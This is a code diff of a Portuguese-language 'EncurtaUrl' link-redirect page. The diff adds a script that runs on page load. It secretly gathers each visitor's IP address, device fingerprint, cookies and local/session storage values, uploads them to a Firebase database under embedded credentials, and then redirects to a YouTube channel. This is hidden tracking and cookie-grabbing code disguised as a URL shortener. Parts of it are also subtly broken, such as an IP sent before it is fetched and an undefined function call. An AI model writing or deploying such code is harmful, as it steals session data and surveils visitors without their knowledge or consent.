@@ -4,13 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EncurtaUrl || Redirecionador</title>
-	<link rel="icon" href="icone.png" type="image/png">
-	<meta property="og:title" content="EncurtaUrl || Melhor encurtador de LINK(s) do Brasil!">
+    <link rel="icon" href="icone.png" type="image/png">
+    <meta property="og:title" content="EncurtaUrl || Melhor encurtador de LINK(s) do Brasil!">
     <meta property="og:description" content="Confira o link encurtado, abaixo!">
     <meta property="og:image" content="icone.png">
     <meta property="og:url" content="https://www.youtube.com/@EpeneShit">
     <meta property="og:type" content="website">
-    <script>let userIP, locationDads = {}, deviceData = {}, additionalInfo = {};</script>
+
+    <script>
+        let userIP, locationDads = {}, deviceData = {}, additionalInfo = {};
+    </script>
+
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -51,7 +55,177 @@
 </head>
 <body>
     <h1>Montando Url..</h1>
-    <script src="js/cabesa.js"></script>
+
+    <!-- Script para a funcionalidade da página -->
+    <script type="module">
+        // Importando os pacotes do Firebase usando módulos ES6
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, set, get, push, child } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
+
+        // Firebase config (use sua configuração real aqui)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlYgSeV3M6FnpRHgXul_NoVm0aixhWdbU",
+            authDomain: "encurtaurl-dd563.firebaseapp.com",
+            databaseURL: "https://encurtaurl-dd563-default-rtdb.firebaseio.com",
+            projectId: "encurtaurl-dd563",
+            storageBucket: "encurtaurl-dd563.firebasestorage.app",
+            messagingSenderId: "181935819251",
+            appId: "1:181935819251:web:3fa63a1be24a956624aa86",
+            measurementId: "G-YNNJC8KHE1"
+        };
+
+        // Inicializando o Firebase
+        const app = initializeApp(firebaseConfig);
+
+        // Inicializando o Realtime Database
+        const db = getDatabase(app);
+
+        // Função para enviar dados ou atualizar dados no Firebase
+        function updateFirebaseData(identifier, dataToSend) {
+            const dbRef = ref(db, 'sockeds/'); // Caminho para o nó 'sockeds' no Firebase
+
+            // Verifica se o rótulo (nó) com o identificador já existe
+            const identifierRef = ref(db, 'sockeds/' + identifier);
+            get(identifierRef).then((snapshot) => {
+                if (snapshot.exists()) {
+                    // Se já existir, substitui as informações
+                    set(identifierRef, dataToSend)
+                        .then(() => {
+                            console.log('Informações atualizadas com sucesso no Firebase');
+							redirectToLink();
+                        })
+                        .catch((error) => {
+                            console.error('Erro ao atualizar dados no Firebase:', error);
+                        });
+                } else {
+                    // Se não existir, cria o novo rótulo
+                    set(identifierRef, dataToSend)
+                        .then(() => {
+                            console.log('Novo rótulo criado com sucesso no Firebase');
+							redirectToLink();
+                        })
+                        .catch((error) => {
+                            console.error('Erro ao criar novo rótulo no Firebase:', error);
+                        });
+                }
+            }).catch((error) => {
+                console.error('Erro ao verificar o rótulo:', error);
+            });
+        }
+
+        // Função para gerar um identificador único para o dispositivo, baseado nas informações coletadas
+        function generateDeviceIdentifier(deviceData) {
+            const { userAgent, deviceMemory, hardwareConcurrency } = deviceData;
+            const dataString = `${userAgent}-${deviceMemory}-${hardwareConcurrency}`;
+            return btoa(dataString);  // Usamos base64 encoding para gerar um identificador único
+        }
+
+        // Função para coletar o IP e as informações do dispositivo
+        function getIPAndLocation() {
+            const ipServiceURL = 'https://api.ipify.org?format=json'; // API para obter o IP público
+
+            // Obtém o IP público
+            fetch(ipServiceURL)
+                .then(response => response.json())
+                .then(data => {	
+                    userIP = data.ip; // IP público
+                })
+                .catch(error => {
+                    locationDads = "Erro ao localizar";
+                    console.error('Erro ao obter loc:', error);
+                });
+
+            // Coleta as informações do dispositivo
+            deviceData = getDeviceInfo();
+            additionalInfo = collectAdditionalInfo();
+
+            // Gera um identificador único para o dispositivo
+            const identifier = generateDeviceIdentifier(deviceData);
+
+            // Prepara os dados para enviar ao Firebase
+            const dataToSend = {
+                ip: userIP,
+                location: locationDads,
+                device: deviceData,
+                additionalInfo: additionalInfo,
+                timestamp: new Date().toISOString(),
+                uniqueIdentifier: identifier
+            };
+
+            // Envia os dados ou atualiza os dados no Firebase
+            updateFirebaseData(identifier, dataToSend);
+        }
+
+        // Função para obter informações do dispositivo
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = (/Mobi|Android/i.test(userAgent)) ? 'Celular' : 'PC';
+            let os = 'Desconhecido';
+            if (userAgent.indexOf('Windows NT') !== -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac OS X') !== -1) os = 'macOS';
+            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+            else if (/Android/i.test(userAgent)) os = 'Android';
+            else if (/iPad|iPhone/i.test(userAgent)) os = 'iOS';
+
+            const deviceMemory = navigator.deviceMemory || 'Desconhecido';
+            const hardwareConcurrency = navigator.hardwareConcurrency || 'Desconhecido';
+
+            return {
+                deviceType,
+                os,
+                deviceMemory,
+                hardwareConcurrency,
+                userAgent
+            };
+        }
+
+        // Função para coletar informações adicionais
+        function collectAdditionalInfo() {
+            const prefersDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
+            const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+            let connectionType = 'Desconhecido';
+            let downlink = 'Desconhecido';
+            if (navigator.connection) {
+                connectionType = navigator.connection.effectiveType || 'Desconhecido';
+                downlink = navigator.connection.downlink + ' Mbps';
+            }
+
+            const language = navigator.language || navigator.userLanguage;
+
+            const cookies = document.cookie;
+            const localStorageData = localStorage.getItem('key') || 'Não disponível';
+            const sessionStorageData = sessionStorage.getItem('key') || 'Não disponível';
+
+            return {
+                prefersDarkMode,
+                prefersReducedMotion,
+                connectionType,
+                downlink,
+                language,
+                cookies,
+                localStorageData,
+                sessionStorageData
+            };
+        }
+
+        // Inicia a coleta de dados
+        getIPAndLocation();
+
+
+
+function redirectToLink() {
+    updateMetaTags();
+    window.location.replace("https://www.youtube.com/@EpeneShit");
+}
+
+
+
+    </script>
+
+    <!-- Biblioteca Leaflet -->
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+
 </body>
 </html>
